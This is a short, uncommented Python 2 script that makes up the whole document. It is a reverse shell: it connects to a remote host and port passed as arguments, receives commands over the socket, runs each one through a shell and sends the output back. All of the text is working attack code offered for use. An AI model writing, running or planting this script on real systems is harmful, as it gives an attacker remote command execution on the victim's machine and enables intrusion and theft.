#!/usr/bin/python
import socket, subprocess, sys
RHOST = sys.argv[1]
RPORT = sys.argv[2]
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, int(RPORT)))
while True:
     try:
          s.send("hello")
          cmd_buffer = s.recv(1024)
          command = cmd_buffer.rstrip()
          if command == "quit":
               s.close()
               exit(0)
          output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
          s.send(output)
     except:
          s.send("wrong command...")


